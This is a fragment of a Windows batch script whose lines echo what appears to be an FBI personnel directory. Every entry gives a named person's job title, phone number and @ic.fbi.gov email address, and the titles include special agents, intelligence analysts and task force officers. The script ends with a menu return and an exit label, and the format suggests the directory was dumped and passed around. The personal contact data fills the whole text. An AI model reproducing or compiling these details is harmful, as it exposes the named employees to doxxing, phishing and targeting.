echo Burke, Jennifer D  GENERAL ATTORNEY 571-280-6099   US Jennifer.Burke@ic.fbi.gov  
echo Burke, John  SUPVY FINGERPRINT EXAMINER 304-625-5623   US John.Burke@ic.fbi.gov  
echo Burke, Kevin  INTELLIGENCE ANALYSIS 202-323-3998 33998   US Kevin.Burke@ic.fbi.gov  
echo Burke, Larry T  CTOC SPECIALIST 202-278-2384   US Larry.Burke@ic.fbi.gov  
echo Burke, Lisa  HR SPECIALIST (GENERALIST) 202-324-9726 49726   US Lisa.Burke@ic.fbi.gov  
echo Burke, Meredith A  RELIEF SUPERVISOR 310-337-9138   US Meredith.Burke@ic.fbi.gov  
echo Burke, Nolan  SPECIAL AGENT 215-521-7614 7614   US Nolan.Burke@ic.fbi.gov  
echo Burke, Patrick A  STUDENT WORKFORCE TRAINEE       Patrick.Burke@ic.fbi.gov  
echo Burke, Rebecca A  INTELLIGENCE ANALYSIS 919-466-1381   US Rebecca.Burke@ic.fbi.gov  
echo Burke, Richard P  FINANCIAL ANALYST 763-569-8000 8338   US Richard.Burke@ic.fbi.gov  
echo Burke, Ryan S  SPECIAL AGENT 702-584-5529   US Ryan.Burke@ic.fbi.gov  
echo Burke, Sean D  TASK FORCE OFFICER 973-792-3000     Sean.Burke2@ic.fbi.gov  
echo Burke, Sean J  SPECIAL AGENT 312-829-5784 5784   US Sean.Burke@ic.fbi.gov  
echo Burke, Terry L  SUPVY ACCOUNTANT (FORENSIC) 972-559-5552 5552   US Terry.Burke@ic.fbi.gov  
echo Burke, Timothy. J J  SPECIAL AGENT 404-679-6380   US Timothy.J.Burke@ic.fbi.gov  
echo Burke, Warren R  RELIEF SUPERVISOR 702-668-7012   US Warren.Burke@ic.fbi.gov  
echo Burkes, Robert A  CONTRACTOR     US Robert.Burkes@ic.fbi.gov  
echo Burkes, Ted M  DOCUMENT ANALYST - FE 703-632-7313 7313   US Ted.Burkes@ic.fbi.gov  
echo Burkett, Lisa M  MGMT&PROG ANAL 703-553-7257   US Lisa.Burkett@ic.fbi.gov  
echo Burkett, Stacey  IDENTIFICATION RECORDS EXAMINER 304-625-9504   US Stacey.Burkett@ic.fbi.gov  
echo Burkett, Tammy L  FORENSIC ACCOUNTANT 561-822-5969   US Tammy.Burkett@ic.fbi.gov  
echo Burkhalter, Matthew  PRINCIPAL RELIEF SUPERVISOR 505-889-1377   US Matthew.Burkhalter@ic.fbi.gov  
echo Burkhardt, Eric  SUPVY SPECIAL AGENT 202-323-9102 39102   US Eric.Burkhardt@ic.fbi.gov  
echo Burkhart, Joann L  RELIEF SUPERVISOR 317-595-4000   US Joann.Burkhart@ic.fbi.gov  
echo Burkhead, D R  STATIONARY SUPERVISOR 972-559-5000 5314   US D.Burkhead@ic.fbi.gov  
echo Burkholder, Jill  PROGRAM MANAGER - ASC 202-324-2463 42463   US Jill.Burkholder@ic.fbi.gov  
echo Burkin, Jerald R  RELIEF SUPERVISOR 702-668-7024   US Jerald.Burkin@ic.fbi.gov  
echo Burkins, Terri D  OPERATIONAL SUPPORT TECHNICIAN 901-747-4300   US Terri.Burkins@ic.fbi.gov  
echo Burks, Christian  ITSPEC (SYSANALYSIS) 703-985-6537 6537   US Christian.Burks@ic.fbi.gov  
echo Burks, Daniel  TASK FORCE OFFICER 303-629-7171     Daniel.Burks@ic.fbi.gov  
echo Burkwit, Sarah M  GENERAL ATTORNEY 808-566-2900   US Sarah.Burkwit@ic.fbi.gov  
echo Burlar, Trillane  CONTRACTOR 703-335-1587     Trillane.Burlar@ic.fbi.gov  
echo Burlette, Jeffrey D  DETAILEE 571-305-6211     Jeffrey.Burlette@ic.fbi.gov   
pause
goto menu

:exit
exit
                

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
